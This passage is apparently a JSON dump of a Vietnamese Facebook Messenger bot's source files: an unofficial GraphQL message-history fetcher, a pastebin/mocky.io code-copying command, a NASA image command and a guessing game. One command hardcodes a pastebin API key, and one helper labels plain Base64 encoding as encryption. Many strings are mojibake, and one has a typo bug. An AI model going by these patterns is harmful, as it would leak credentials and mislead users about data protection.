reaction.user.id\n  };\n}\n\nfunction formatEventData(event) {\n  if (event == null) return {};\n\n  switch (event.__typename) {\n    case \"ThemeColorExtensibleMessageAdminText\":\n      return { color: event.theme_color };\n    case \"ThreadNicknameExtensibleMessageAdminText\":\n      return {\n        nickname: event.nickname,\n        participantID: event.participant_id\n      };\n    case \"ThreadIconExtensibleMessageAdminText\":\n      return { threadIcon: event.thread_icon };\n    case \"InstantGameUpdateExtensibleMessageAdminText\":\n      return {\n        gameID: (event.game == null ? null : event.game.id),\n        update_type: event.update_type,\n        collapsed_text: event.collapsed_text,\n        expanded_text: event.expanded_text,\n        instant_game_update_data: event.instant_game_update_data\n      };\n    case \"GameScoreExtensibleMessageAdminText\":\n      return { game_type: event.game_type };\n    case \"RtcCallLogExtensibleMessageAdminText\":\n      return {\n        event: event.event,\n        is_video_call: event.is_video_call,\n        server_info_data: event.server_info_data\n      };\n    case \"GroupPollExtensibleMessageAdminText\":\n      return {\n        event_type: event.event_type,\n        total_count: event.total_count,\n        question: event.question\n      };\n    case \"AcceptPendingThreadExtensibleMessageAdminText\":\n      return {\n        accepter_id: event.accepter_id,\n        requester_id: event.requester_id\n      };\n    case \"ConfirmFriendRequestExtensibleMessageAdminText\":\n      return {\n        friend_request_recipient: event.friend_request_recipient,\n        friend_request_sender: event.friend_request_sender\n      };\n    case \"AddContactExtensibleMessageAdminText\":\n      return {\n        contact_added_id: event.contact_added_id,\n        contact_adder_id: event.contact_adder_id\n      };\n    case \"AdExtensibleMessageAdminText\":\n      return {\n        ad_client_token: event.ad_client_token,\n        ad_id: event.ad_id,\n        ad_preferences_link: event.ad_preferences_link,\n        ad_properties: event.ad_properties\n      };\n    // never data\n    case \"ParticipantJoinedGroupCallExtensibleMessageAdminText\":\n    case \"ThreadEphemeralTtlModeExtensibleMessageAdminText\":\n    case \"StartedSharingVideoExtensibleMessageAdminText\":\n    case \"LightweightEventCreateExtensibleMessageAdminText\":\n    case \"LightweightEventNotifyExtensibleMessageAdminText\":\n    case \"LightweightEventNotifyBeforeEventExtensibleMessageAdminText\":\n    case \"LightweightEventUpdateTitleExtensibleMessageAdminText\":\n    case \"LightweightEventUpdateTimeExtensibleMessageAdminText\":\n    case \"LightweightEventUpdateLocationExtensibleMessageAdminText\":\n    case \"LightweightEventDeleteExtensibleMessageAdminText\":\n      return {};\n    default:\n      return { error: \"Don't know what to with event data type \" + event.__typename };\n  }\n}\n\nfunction formatMessagesGraphQLResponse(data) {\n  var messageThread = data.o0.data.message_thread;\n  var threadID = messageThread.thread_key.thread_fbid ? messageThread.thread_key.thread_fbid : messageThread.thread_key.other_user_id;\n\n  var messages = messageThread.messages.nodes.map(function (d) {\n    switch (d.__typename) {\n      case \"UserMessage\":\n        // Give priority to stickers. They're seen as normal messages but we've\n        // been considering them as attachments.\n        var maybeStickerAttachment;\n        if (d.sticker) {\n          maybeStickerAttachment = [\n            {\n              type: \"sticker\",\n              ID: d.sticker.id,\n              url: d.sticker.url,\n\n              packID: d.sticker.pack.id,\n              spriteUrl: d.sticker.sprite_image,\n              spriteUrl2x: d.sticker.sprite_image_2x,\n              width: d.sticker.width,\n              height: d.sticker.height,\n\n              caption: d.snippet, // Not sure what the heck caption was.\n              description: d.sticker.label, // Not sure about this one either.\n\n              frameCount: d.sticker.frame_count,\n              frameRate: d.sticker.frame_rate,\n              framesPerRow: d.sticker.frames_per_row,\n              framesPerCol: d.sticker.frames_per_col,\n\n              stickerID: d.sticker.id, // @Legacy\n              spriteURI: d.sticker.sprite_image, // @Legacy\n              spriteURI2x: d.sticker.sprite_image_2x // @Legacy\n            }\n          ];\n        }\n\n        var mentionsObj = {};\n        if (d.message !== null) {\n          d.message.ranges.forEach(e => mentionsObj[e.entity.id] = d.message.text.substr(e.offset, e.length));\n        }\n\n        return {\n          type: \"message\",\n          attachments: maybeStickerAttachment\n            ? maybeStickerAttachment\n            : d.blob_attachments && d.blob_attachments.length > 0\n              ? d.blob_attachments.map(formatAttachmentsGraphQLResponse)\n              : d.extensible_attachment\n                ? [formatExtensibleAttachment(d.extensible_attachment)]\n                : [],\n          body: d.message !== null ? d.message.text : '',\n          isGroup: messageThread.thread_type === \"GROUP\",\n          messageID: d.message_id,\n          senderID: d.message_sender.id,\n          threadID: threadID,\n          timestamp: d.timestamp_precise,\n\n          mentions: mentionsObj,\n          isUnread: d.unread,\n\n          // New\n          messageReactions: d.message_reactions ? d.message_reactions.map(formatReactionsGraphQL) : null,\n          isSponsored: d.is_sponsored,\n          snippet: d.snippet\n        };\n      case \"ThreadNameMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"change_thread_name\",\n          snippet: d.snippet,\n          eventData: { threadName: d.thread_name },\n\n          // @Legacy\n          author: d.message_sender.id,\n          logMessageType: \"log:thread-name\",\n          logMessageData: { name: d.thread_name }\n        };\n      case \"ThreadImageMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"change_thread_image\",\n          snippet: d.snippet,\n          eventData: d.image_with_metadata == null\n            ? {} /* removed image */\n            : {\n              /* image added */\n              threadImage: {\n                attachmentID: d.image_with_metadata.legacy_attachment_id,\n                width: d.image_with_metadata.original_dimensions.x,\n                height: d.image_with_metadata.original_dimensions.y,\n                url: d.image_with_metadata.preview.uri\n              }\n            },\n\n          // @Legacy\n          logMessageType: \"log:thread-icon\",\n          logMessageData: { thread_icon: d.image_with_metadata ? d.image_with_metadata.preview.uri : null }\n        };\n      case \"ParticipantLeftMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"remove_participants\",\n          snippet: d.snippet,\n          eventData: {\n            // Array of IDs.\n            participantsRemoved: d.participants_removed.map(function (p) {\n              return p.id;\n            })\n          },\n\n          // @Legacy\n          logMessageType: \"log:unsubscribe\",\n          logMessageData: {\n            leftParticipantFbId: d.participants_removed.map(function (p) {\n              return p.id;\n            })\n          }\n        };\n      case \"ParticipantsAddedMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"add_participants\",\n          snippet: d.snippet,\n          eventData: {\n            // Array of IDs.\n            participantsAdded: d.participants_added.map(function (p) {\n              return p.id;\n            })\n          },\n\n          // @Legacy\n          logMessageType: \"log:subscribe\",\n          logMessageData: {\n            addedParticipants: d.participants_added.map(function (p) {\n              return p.id;\n            })\n          }\n        };\n      case \"VideoCallMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"video_call\",\n          snippet: d.snippet,\n\n          // @Legacy\n          logMessageType: \"other\"\n        };\n      case \"VoiceCallMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          eventType: \"voice_call\",\n          snippet: d.snippet,\n\n          // @Legacy\n          logMessageType: \"other\"\n        };\n      case \"GenericAdminTextMessage\":\n        return {\n          type: \"event\",\n          messageID: d.message_id,\n          threadID: threadID,\n          isGroup: messageThread.thread_type === \"GROUP\",\n          senderID: d.message_sender.id,\n          timestamp: d.timestamp_precise,\n          snippet: d.snippet,\n          eventType: d.extensible_message_admin_text_type.toLowerCase(),\n          eventData: formatEventData(d.extensible_message_admin_text),\n\n          // @Legacy\n          logMessageType: utils.getAdminTextMessageType(\n            d.extensible_message_admin_text_type\n          ),\n          logMessageData: d.extensible_message_admin_text // Maybe different?\n        };\n      default:\n        return { error: \"Don't know about message type \" + d.__typename };\n    }\n  });\n  return messages;\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getThreadHistoryGraphQL(threadID, amount, timestamp, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    // `queries` has to be a string. I couldn't tell from the dev console. This\n    // took me a really long time to figure out. I deserve a cookie for this.\n    var form = {\n      \"av\": ctx.globalOptions.pageID,\n      queries: JSON.stringify({\n        o0: {\n          // This doc_id was valid on February 2nd 2017.\n          doc_id: \"1498317363570230\",\n          query_params: {\n            id: threadID,\n            message_limit: amount,\n            load_messages: 1,\n            load_read_receipts: false,\n            before: timestamp\n          }\n        }\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        // This returns us an array of things. The last one is the success /\n        // failure one.\n        // @TODO What do we do in this case?\n        if (resData[resData.length - 1].error_results !== 0) throw new Error(\"There was an error_result.\");\n        callback(null, formatMessagesGraphQLResponse(resData[0]));\n      })\n      .catch(function (err) {\n        log.error(\"getThreadHistoryGraphQL\", \"L·ªói getThreadHistoryGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":20091,"size_tokens":null},"modules/commands/change.js":{"content":"module.exports.config = {\n    name: \"change\",\n    version: \"1.1.1\",\n    hasPermssion: 3,\n    credits: \"Qu·∫•t\",\n    description: \"ƒê·ªïi raw runmocky and pastebin\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"/test\",\n    cooldowns: 3,\n    usePrefix: false\n   };\n   const axios = require('axios');\n   const fs = require('fs');\n   module.exports.run = async function ({ api, event, args }) {\n    if (event.type === 'message_reply' && event.messageReply.body !== '') {\n    const attachment = event.messageReply.body;\n    if (attachment.includes('pastebin.com')) {\n    const pastebinLink = attachment;\n   \n   axios.get(pastebinLink).then(response => {\n    const sourceCode = response.data\n   \n   axios.post(\"https://api.mocky.io/api/mock\", {\n    \"status\": 200,\n    \"content\": sourceCode,\n    \"content_type\": \"application/json\",\n    \"charset\": \"UTF-8\",\n    \"secret\": \"DongDev\",\n    \"expiration\": \"never\"\n   }).then(function(response) {\n    return api.sendMessage(`${response.data.link}`, event.threadID, event.messageID);\n    }).catch(e => {\n    console.log(e)\n    return api.sendMessage('L·ªói khi upcode t·ª´ pasterbin l√™n runmocky!', event.threadID)\n    }) \n    });\n    } else if(attachment.includes('run.mocky.io')) {\n    const runmockyLink = attachment;\n    axios.get(runmockyLink).then(async response => {\n    const sourceCode = response.data\n    const { PasteClient } = require('pastebin-api');\n    const client = new PasteClient(\"GT50TmDosqBBicH60IXyiTANFaXGBxCZ\");\n    async function pastepin(name) {\n    const url = await client.createPaste({\n    code: sourceCode,\n    expireDate: 'N',\n    format: \"javascript\",\n    name: name,\n    publicity: 1\n    });\n    var id = url.split('/')[3]\n    return 'https://pastebin.com/raw/' + id\n    }\n    var name = await generateId()\n    var link = await pastepin(name)\n    return api.sendMessage(`${link}`, event.threadID, event.messageID);\n    }).catch(e =>{\n    console.log(e)\n    return api.sendMessage('L·ªói khi upcode t·ª´ runmocky l√™n pasterbin!', event.threadID)\n    })\n    }\n    }\n   }\n   function generateId() {\n    const min = 100000;\n    const max = 999999;\n    const randomSixDigitId = Math.floor(Math.random() * (max - min + 1)) + min;\n    return randomSixDigitId;\n    }","path":null,"size_bytes":2232,"size_tokens":null},"modules/commands/earth.js":{"content":"const request = global.nodemodule['request'];\nconst fs = global.nodemodule['fs']\nmodule.exports.config = {\n  name: \"earth\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"BerVer\",\n  description: \"Xem h√¨nh ·∫£nh tr√°i ƒë·∫•t g·∫ßn ƒë√¢y nh·∫•t\",\n  commandCategory: \"Ti·ªán √≠ch\",\n  usages: \"earth\",\n  cooldowns: 30,\n  dependencies: {\n    \"request\": \"\",\n  \"fs\": \"\"\n}\n};\n\nmodule.exports.run = function({\n  api,\n  event,\n  args,\n  client,\n  __GLOBAL\n}) {\n  return request(`https://api.nasa.gov/EPIC/api/natural/images?api_key=DEMO_KEY`, (err, response, body) => {\n    if (err) throw err;\n    var jsonData = JSON.parse(body);\n    var randomNumber = Math.floor(Math.random() * ((jsonData.length - 1) + 1));\n    var image_name = jsonData[randomNumber].image\n    var date = jsonData[randomNumber].date;\n    var date_split = date.split(\"-\")\n    var year = date_split[0];\n    var month = date_split[1];\n    var day_and_time = date_split[2];\n    var sliced_date = day_and_time.slice(0, 2);\n    var image_link = `https://epic.gsfc.nasa.gov/archive/natural/${year}/${month}/${sliced_date}/png/` + image_name + \".png\";\n    let callback = function() {\n      api.sendMessage({\n        body: `${jsonData[randomNumber].caption} on ${date}`,\n        attachment: fs.createReadStream(__dirname + `/cache/randompic.png`)\n      }, event.threadID, () => fs.unlinkSync(__dirname + `/cache/randompic.png`), event.messageID);\n    };\n    request(image_link).pipe(fs.createWriteStream(__dirname + `/cache/randompic.png`)).on(\"close\", callback);\n  });\n  }","path":null,"size_bytes":1530,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Step_2.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\n\n/**\n * Encrypt the text using the CryptoJS library and return the encrypted text as a Base64 string.\n * @param Data - The data to be encrypted.\n * @returns A string of characters that represent the encrypted data.\n */\nmodule.exports.Encrypt = function Encrypt(Data) {\n    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(Data));\n};\n\n/**\n * Decrypt the data using the CryptoJS library, and return the decrypted data as a string.\n * @param Data - The data to be decrypted.\n * @returns The decrypted data.\n */\n\nmodule.exports.Decrypt = function Decrypt(Data) {\n    return CryptoJS.enc.Base64.parse(Data).toString(CryptoJS.enc.Utf8);\n};\n","path":null,"size_bytes":698,"size_tokens":null},"modules/commands/dhbc.js":{"content":"  const coinsup = 5000 //thay s·ªë coins ƒë∆∞·ª£c nh·∫≠n khi ƒëo√°n tr√∫ng\nconst coinsdown = 2000 //thay s·ªë coins b·ªã m·∫•t khi y√™u c·∫ßu g·ª£i √Ω\nconst timeUnsend = 1 //th·ªùi gian thu h·ªìi tin nh·∫Øn sau khi tr·∫£ l·ªùi ƒë√∫ng trong th·ªùi gian timeUnsend\nconst axios = global.nodemodule[\"axios\"];\nmodule.exports.config = {\n    name: \"dhbc\",\n    version: \"1.2.0\",\n    hasPermssion: 0,\n    credits: \"D-Jukie\",\n    description: \"ƒêu·ªïi h√¨nh b·∫Øt ch·ªØ tr√™n ch√≠nh messenger c·ªßa b·∫°n!!!\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"[1/2]\",\n    cooldowns: 10\n};\n\n\nmodule.exports.handleReply = async function ({\n    args,\n    event,\n    Users,\n    api,\n    handleReply,\n    Currencies\n}) {\n    var {\n        tukhoa,\n        suggestions\n    } = handleReply;\n    switch (handleReply.type) {\n    case \"choosee\": {\n        switch (event.body) {\n        case \"2\": {\n            api.unsendMessage(handleReply.messageID);\n            const res = await axios.get(`https://raw.githubusercontent.com/TuanDeepTry-14072003/API/mainV2/data.json`);\n            const length1 = res.data.doanhinh.length\n            const dataGame = res.data.doanhinh[Math.floor(Math.random() * length1)]\n            const tukhoadung = dataGame.tukhoa;\n            const suggestions = dataGame.suggestions\n            const fs = global.nodemodule[\"fs-extra\"];\n            const sokitu = dataGame.sokitu;\n            const anh1 = dataGame.link1\n            const anh2 = dataGame.link2\n\n\n            let Avatar = (await axios.get(anh1, {\n                responseType: \"arraybuffer\"\n            })).data;\n            fs.writeFileSync(__dirname + \"/cache/anh1.png\", Buffer.from(Avatar, \"utf-8\"));\n            let Avatar2 = (await axios.get(anh2, {\n                responseType: \"arraybuffer\"\n            })).data;\n            fs.writeFileSync(__dirname + \"/cache/anh2.png\", Buffer.from(Avatar2, \"utf-8\"));\n            var imglove = [];\n            imglove.push(fs.createReadStream(__dirname + \"/cache/anh1.png\"));\n            imglove.push(fs.createReadStream(__dirname + \"/cache/anh2.png\"));\n\n            var msg = {\n                body: `üå∏ ùó©ùòÇùó∂ ùóπùóºÃÄùóªùó¥ ùóøùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùòÅùóøùóÆÃâ ùóπùóºÃõÃÄùó∂:\\nùóöùóºÃõÃ£ùó∂ ùòÜÃÅ: ${sokitu}\\n\\nüå∏ ùó•ùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùóªùóµùóÆÃ£ÃÇùóΩ \"ùóöùóºÃõÃ£ùó∂ ùòÜÃÅ\" - ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùó¥ùóºÃõÃ£ùó∂ ùòÜÃÅ ùüÆ (-${coinsdown}$)`,\n                attachment: imglove\n            }\n            return api.sendMessage(msg, event.threadID, (error, info) => {\n                global.client.handleReply.push({\n                    type: \"reply\",\n                    name: this.config.name,\n                    author: event.senderID,\n                    messageID: info.messageID,\n                    tukhoa: tukhoadung,\n                    suggestions: suggestions\n                })\n            })\n        }\n        case \"1\": {\n            api.unsendMessage(handleReply.messageID);\n            const res = await axios.get(`https://raw.githubusercontent.com/TuanDeepTry-14072003/API/mainV2/data2.json`);\n            const length2 = res.data.doanhinh.length\n            const dataGame = res.data.doanhinh[Math.floor(Math.random() * length2)]\n            const tukhoadung = dataGame.tukhoa;\n            const suggestions = dataGame.suggestions\n            const fs = global.nodemodule[\"fs-extra\"];\n            const sokitu = dataGame.sokitu;\n            const anh1 = dataGame.link\n\n\n            let Avatar = (await axios.get(anh1, {\n                responseType: \"arraybuffer\"\n            })).data;\n            fs.writeFileSync(__dirname + \"/cache/anh1.png\", Buffer.from(Avatar, \"utf-8\"));\n            var imglove = [];\n            imglove.push(fs.createReadStream(__dirname + \"/cache/anh1.png\"));\n\n            var msg = {\n                body: `üå∏ ùó©ùòÇùó∂ ùóπùóºÃÄùóªùó¥ ùóøùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùòÅùóøùóÆÃâ ùóπùóºÃõÃÄùó∂:\\nùóöùóºÃõÃ£ùó∂ ùòÜÃÅ: ${sokitu}\\n\\nüå∏ ùó•ùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùóªùóµùóÆÃ£ÃÇùóΩ \"ùóöùóºÃõÃ£ùó∂ ùòÜÃÅ\" - ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùó¥ùóºÃõÃ£ùó∂ ùòÜÃÅ ùüÆ (-${coinsdown}$)`,\n                attachment: imglove\n            }\n            return api.sendMessage(msg, event.threadID, (error, info) => {\n                global.client.handleReply.push({\n                    type: \"reply2\",\n                    name: this.config.name,\n                    author: event.senderID,\n                    messageID: info.messageID,\n                    tukhoa: tukhoadung,\n                    suggestions: suggestions\n                })\n            })\n        }\n        }\n        const choose = parseInt(event.body);\n        if (isNaN(event.body)) return api.sendMessage(\"üå∏ ùó©ùòÇùó∂ ùóπùóºÃÄùóªùó¥ ùóªùóµùóÆÃ£ÃÇùóΩ ùü≠ ùó∞ùóºùóª ùòÄùóºÃÇÃÅ\", event.threadID, event.messageID);\n        if (choose > 2 || choose < 1) return api.sendMessage(\"üå∏ ùóüùòÇÃõÃ£ùóÆ ùó∞ùóµùóºÃ£ùóª ùó∏ùóµùóºÃÇùóªùó¥ ùóªùóÆÃÜÃÄùó∫ ùòÅùóøùóºùóªùó¥ ùó±ùóÆùóªùóµ ùòÄùóÆÃÅùó∞ùóµ.\", event.threadID, event.messageID)\n    }\n\n\n    case \"reply\": {\n        const dapan = event.body\n        if (dapan.toLowerCase() == \"g·ª£i √Ω\" ) { \n            let balance = (await Currencies.getData(event.senderID)).money;\n            if (coinsdown > balance) return api.sendMessage(`üå∏ ùó¶ùóºÃÇÃÅ ùó±ùòÇÃõ ùóØùó∂Ã£ ùòÅùóµùó∂ùó≤ÃÇÃÅùòÇ, ùó∞ùóÆÃÇÃÄùóª ${coinsdown}$ ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùó¥ùóºÃõÃ£ùó∂ ùòÜÃÅ`,event.threadID,event.messageID);\n            await Currencies.decreaseMoney(event.senderID, parseInt(coinsdown))\n            api.sendMessage(`üå∏ ùóöùóºÃõÃ£ùó∂ ùòÜÃÅ ùó∞ùóµùóº ùóØùóÆÃ£ùóª ùóπùóÆÃÄ: \\n${suggestions} (-${coinsdown}$)`, event.threadID, event.messageID) \n        }\n        else { \n        if (dapan.toLowerCase() == tukhoa) {\n            //console.log(suggestions)\n            await Currencies.increaseMoney(event.senderID, parseInt(coinsup))\n            var name1 = await Users.getData(event.senderID)\n            setTimeout(function () {\n                api.unsendMessage(handleReply.messageID);\n            }, timeUnsend*1000);\n            return api.sendMessage(`üå∏ ${name1.name} ùòÉùòÇÃõÃÄùóÆ ùòÅùóøùóÆÃâ ùóπùóºÃõÃÄùó∂ ùó∞ùóµùó∂ÃÅùóªùóµ ùòÖùóÆÃÅùó∞\\nüå∏ ùóûùó≤ÃÇÃÅùòÅ ùóæùòÇùóÆÃâ: ${tukhoa} (+${coinsup}$)`, event.threadID, event.messageID)\n        } else\n            return api.sendMessage(`üå∏ ùó¶ùóÆùó∂ ùóøùóºÃÇÃÄùó∂ ùóªùóµùóÆ`, event.threadID, event.messageID)\n    }\n} ; break;\n    case \"reply2\": {\n        const dapan1 = event.body\n        if (dapan1.toLowerCase() == \"g·ª£i √Ω\") { \n            let balance = (await Currencies.getData(event.senderID)).money;\n            if (coinsdown > balance) return api.sendMessage(`ùó¶ùóºÃÇÃÅ ùó±ùòÇÃõ ùóØùó∂Ã£ ùòÅùóµùó∂ùó≤ÃÇÃÅùòÇ, ùó∞ùóÆÃÇÃÄùóª ${coinsdown}$ ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùó¥ùóºÃõÃ£ùó∂ ùòÜÃÅ`,event.threadID,event.messageID);\n            await Currencies.decreaseMoney(event.senderID, parseInt(coinsdown))\n            api.sendMessage(`üå∏ ùóöùóºÃõÃ£ùó∂ ùòÜÃÅ ùó∞ùóµùóº ùóØùóÆÃ£ùóª ùóπùóÆÃÄ: \\n${suggestions} (-${coinsdown}$)`, event.threadID, event.messageID) \n        }\n            else {\n\n        if (dapan1.toLowerCase() == tukhoa) {\n            await Currencies.increaseMoney(event.senderID, parseInt(coinsup))\n            var name1 = await Users.getData(event.senderID)\n            setTimeout(function () {\n                api.unsendMessage(handleReply.messageID);\n            }, timeUnsend*1000);\n            return api.sendMessage(`üå∏ ${name1.name} ùòÉùòÇÃõÃÄùóÆ ùòÅùóøùóÆÃâ ùóπùóºÃõÃÄùó∂ ùó∞ùóµùó∂ÃÅùóªùóµ ùòÖùóÆÃÅùó∞\\nüå∏ ùóûùó≤ÃÇÃÅùòÅ ùóæùòÇùóÆÃâ: ${tukhoa} (+${coinsup}$)`, event.threadID, event.messageID)\n        } else\n            return api.sendMessage(`üå∏ ùó¶ùóÆùó∂ ùóøùóºÃÇÃÄùó∂ ùóªùóµùóÆ`, event.threadID, event.messageID)\n}\n}\ndefault: break;\n\n}\n}\n\nmodule.exports.run = async function ({\n    args,\n    api,\n    event,\n    Users\n}) {\n    if ((this.config.credits) != \"D-Jukie\") { return api.sendMessage(`‚ö°Ô∏èPh√°t hi·ªán credits ƒë√£ b·ªã thay ƒë·ªïi`, event.threadID, event.messageID)}\n    if (!args[0]) {\n    return api.sendMessage(`üíÆ===== [ ùóóùóõùóïùóñ ] =====üíÆ\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n\\nüå∏ ùó©ùòÇùó∂ ùóπùóºÃÄùóªùó¥ ùó∞ùóµùóºÃ£ùóª ùó∏ùó∂ùó≤ÃÇÃâùòÇ ùó∞ùóµùóºÃõùó∂:\\n\\nùü≠: ùó†ùóºÃ£ÃÇùòÅ ùóÆÃâùóªùóµ\\nùüÆ: ùóõùóÆùó∂ ùóÆÃâùóªùóµ\\n\\nüå∏ ùóõùóÆÃÉùòÜ ùóøùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùó∞ùóµùóºÃ£ùóª ùóªùóµùó≤ÃÅ`, event.threadID, (error, info) => {\n\n            global.client.handleReply.push({\n                type: \"choosee\",\n                name: this.config.name,\n                author: event.senderID,\n                messageID: info.messageID\n            })\n        })\n    }\n    if (args[0] == '1') {\n    //api.unsendMessage(handleReply.messageID);\n            const res = await axios.get(`https://raw.githubusercontent.com/TuanDeepTry-14072003/API/mainV2/data2.json`);\n            const length2 = res.data.doanhinh.length\n            const dataGame = res.data.doanhinh[Math.floor(Math.random() * length2)]\n            const tukhoadung = dataGame.tukhoa;\n            const suggestions = dataGame.suggestions\n            const fs = global.nodemodule[\"fs-extra\"];\n            const sokitu = dataGame.sokitu;\n            const anh1 = dataGame.link\n\n\n            let Avatar = (await axios.get(anh1, {\n                responseType: \"arraybuffer\"\n            })).data;\n            fs.writeFileSync(__dirname + \"/cache/anh1.png\", Buffer.from(Avatar, \"utf-8\"));\n            var imglove = [];\n            imglove.push(fs.createReadStream(__dirname + \"/cache/anh1.png\"));\n\n            var msg = {\n                body: `üå∏ ùó©ùòÇùó∂ ùóπùóºÃÄùóªùó¥ ùóøùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùòÅùóøùóÆÃâ ùóπùóºÃõÃÄùó∂:\\nùóöùóºÃõÃ£ùó∂ ùòÜÃÅ: ${sokitu}\\n\\nüå∏ ùó•ùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùóªùóµùóÆÃ£ÃÇùóΩ \"ùóöùóºÃõÃ£ùó∂ ùòÜÃÅ\" - ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ ùó¥ùóºÃõÃ£ùó∂ ùòÜÃÅ ùüÆ (-${coinsdown}$)`,\n                attachment: imglove\n            }\n            return api.sendMessage(msg, event.threadID, (error, info) => {\n                global.client.handleReply.push({\n                    type: \"reply2\",\n                    name: this.config.name,\n                    author: event.senderID,\n                    messageID: info.messageID,\n                    tukhoa: tukhoadung,\n                    suggestions: suggestions\n                })\n            })    \n    }\n    if (args[0] == '2') {\n    //api.unsendMessage(handleReply.messageID);\n            const res = await axios.get(`https://raw.githubusercontent.com/TuanDeepTry-14072003/API/mainV2/data2.json`);\n            const length1 = res.data.doanhinh.length\n            const dataGame = res.data.doanhinh[Math.floor(Math.random() * length1)]\n            const tukhoadung = dataGame.tukhoa;\n            const suggestions = dataGame.suggestions\n            const fs = global.nodemodule[\"fs-extra\"];\n            const sokitu = dataGame.sokitu;\n            const anh1 = dataGame.link1\n            const anh2 = dataGame.link2\n\n\n            let Avatar = (await axios.get(anh1, {\n                responseType: \"arraybuffer\"\n            })).data;\n            fs.writeFileSync(__dirname + \"/cache/anh1.png\", Buffer.from(Avatar, \"utf-8\"));\n            let Avatar2 = (await axios.get(anh2, {\n                responseType: \"arraybuffer\"\n            })).data;\n            fs.writeFileSync(__dirname + \"/cache/anh2.png\", Buffer.from(Avatar2, \"utf-8\"));\n            var imglove = [];\n            imglove.push(fs.createReadStream(__dirname + \"/cache/anh1.png\"));\n            imglove.push(fs.createReadStream(__dirname + \"/cache/anh2.png\"));\n\n            var msg = {\n                body: `üå∏ ùó©ùòÇùó∂ ùóπùóºÃÄùóªùó¥ ùóøùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùòÅùóøùóÆÃâ ùóπùóºÃõÃÄùó∂:\\nùóöùóºÃõÃ£ùó∂ ùòÜÃÅ: ${sokiu}\\n\\nüå∏ ùó•ùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùòÉùóÆÃÄ ùóªùóµùóÆÃ£ÃÇùóΩ \"ùóöùóºÃõÃ£ùó∂ ùòÜÃÅ\" - ùóªùó≤ÃÇÃÅùòÇ ùó∫ùòÇùóºÃÇÃÅùóª ùòÖùó≤ùó∫ 